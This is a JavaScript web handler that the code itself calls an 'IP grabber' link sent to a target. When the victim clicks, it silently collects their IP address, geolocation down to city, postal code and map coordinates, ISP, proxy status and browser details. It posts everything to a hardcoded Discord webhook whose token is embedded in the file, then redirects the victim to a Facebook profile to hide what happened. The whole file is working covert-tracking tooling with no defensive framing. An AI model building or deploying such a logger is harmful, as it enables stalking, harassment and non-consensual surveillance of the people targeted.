import fetch from 'node-fetch';

const webhookUrl = "https://discord.com/api/webhooks/1306087539169296484/vP5BQM6ius3zPupcdWazfCNQNpuEFstMUeSYKpVJ5i_vxTxWpdyo2mWcHqQDXC7Y0Tr3";

// Function to send message to webhook
async function sendToWebhook(message) {
    try {
        const response = await fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(message),
        });

        if (!response.ok) {
            console.error(`Failed to send data to webhook. Status: ${response.status}`);
        } else {
            console.log("Data sent to webhook successfully.");
        }
    } catch (error) {
        console.error("Failed to send data to webhook:", error);
    }
}

// Function to fetch IP details
async function getIpDetails(ip) {
    try {
        const response = await fetch(`http://ip-api.com/json/${ip}?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,isp,org,as,mobile,proxy,hosting,query`);
        return await response.json();
    } catch (error) {
        console.error("Failed to retrieve IP information:", error);
        return null;
    }
}

// Function to detect device type
function detectDeviceType(userAgent) {
    if (/Mobile|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent)) {
        return "Mobile";
    } else if (/Tablet|iPad/i.test(userAgent)) {
        return "Tablet";
    } else {
        return "Desktop";
    }
}

// Function to handle initial link generation alert
async function sendInitialLinkAlert() {
    const initialAlertMessage = {
        username: "Link Sent Logger",
        content: "⚠️ **Alert:** IP grabber link was sent to target.",
        embeds: [
            {
                title: "Link Sent to Target",
                color: 0xFFA500, // Orange color for alert
                description: "An IP grabber link was sent to a target.",
                fields: [
                    { name: "Status", value: "Link generated and sent", inline: true },
                    { name: "Hosting Detection", value: "Yes", inline: true }
                ]
            }
        ]
    };
    await sendToWebhook(initialAlertMessage);
}

// Main handler function
export default async function handler(req, res) {
    // Send an alert when the link is generated/sent to the target
    if (req.method === 'POST' && req.url === '/generate-link') {
        await sendInitialLinkAlert();
        res.status(200).json({ message: "Link alert sent to webhook." });
        return;
    }
    
    if (req.method === 'GET') {
        // Get the IP address and fetch details
        const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
        const ipDetails = await getIpDetails(ip);

        if (!ipDetails || ipDetails.status !== 'success') {
            res.status(500).send("Failed to retrieve IP information.");
            return;
        }

        const userAgent = req.headers['user-agent'] || 'Unknown';
        const acceptLanguage = req.headers['accept-language'] || 'Unknown';
        const acceptEncoding = req.headers['accept-encoding'] || 'Unknown';
        const doNotTrack = req.headers['dnt'] === '1' ? 'Yes' : 'No';
        const referer = req.headers['referer'] || 'No referer';
        
        const deviceType = detectDeviceType(userAgent);
        const browserEngine = /Chrome|Chromium|Edg/.test(userAgent) ? 'Blink' :
                              /Safari/.test(userAgent) ? 'WebKit' :
                              /Gecko/.test(userAgent) ? 'Gecko' :
                              /Trident/.test(userAgent) ? 'Trident' : 'Unknown';
        const os = /Windows/.test(userAgent) ? 'Windows' :
                   /Mac/.test(userAgent) ? 'macOS' :
                   /Android/.test(userAgent) ? 'Android' :
                   /Linux/.test(userAgent) ? 'Linux' : 'Unknown';

        const coords = ipDetails.lat && ipDetails.lon
            ? `[${ipDetails.lat}, ${ipDetails.lon}](https://www.google.com/maps?q=${ipDetails.lat},${ipDetails.lon})`
            : "Not available";

        const isHosting = ipDetails.hosting ? "Yes" : "No";

        // Prepare detailed information message
        const detailedMessage = {
            username: "Extended Device Info Logger",
            embeds: [
                {
                    title: "Extended Device and Network Information",
                    color: 0x00FFFF,
                    description: "Device info collected from a user clicking the link.",
                    fields: [
                        { name: "IP", value: `\`${ipDetails.query || "Not available"}\``, inline: true },
                        { name: "Provider", value: `\`${ipDetails.isp || "Unknown"}\``, inline: true },
                        { name: "Organization", value: `\`${ipDetails.org || "Unknown"}\``, inline: true },
                        { name: "ASN", value: `\`${ipDetails.as || "Unknown"}\``, inline: true },
                        { name: "Continent", value: `\`${ipDetails.continent || "Unknown"}\``, inline: true },
                        { name: "Country", value: `\`${ipDetails.country || "Unknown"}\``, inline: true },
                        { name: "Region", value: `\`${ipDetails.regionName || "Unknown"}\``, inline: true },
                        { name: "City", value: `\`${ipDetails.city || "Unknown"}\``, inline: true },
                        { name: "District", value: `\`${ipDetails.district || "Unknown"}\``, inline: true },
                        { name: "Postal Code", value: `\`${ipDetails.zip || "Unknown"}\``, inline: true },
                        { name: "Coords", value: coords, inline: true },
                        { name: "Timezone", value: `\`${ipDetails.timezone || "Unknown"}\``, inline: true },
                        { name: "Device Info", value: `\`${userAgent}\``, inline: false },
                        { name: "Device Type", value: `\`${deviceType}\``, inline: true },
                        { name: "Operating System", value: `\`${os}\``, inline: true },
                        { name: "Browser Rendering Engine", value: `\`${browserEngine}\``, inline: true },
                        { name: "Browser Language", value: `\`${acceptLanguage}\``, inline: true },
                        { name: "Accept-Encoding", value: `\`${acceptEncoding}\``, inline: true },
                        { name: "Do Not Track", value: `\`${doNotTrack}\``, inline: true },
                        { name: "Referer", value: `\`${referer}\``, inline: false },
                        { name: "Network Type", value: `\`${ipDetails.mobile ? "Mobile" : "Broadband"}\``, inline: true },
                        { name: "Using Proxy/VPN", value: `\`${ipDetails.proxy ? "Yes" : "No"}\``, inline: true },
                        { name: "Hosting", value: `\`${isHosting}\``, inline: true }
                    ]
                }
            ]
        };

        // Send the detailed message to the webhook upon user clicking the link
        await sendToWebhook(detailedMessage);
        
        // Redirect user
        res.writeHead(302, { Location: 'https://www.facebook.com/janethalejandra.gonzalez.7?mibextid=LQQJ4d' });
        res.end();
    } else {
        res.status(405).send("Method Not Allowed");
    }
}
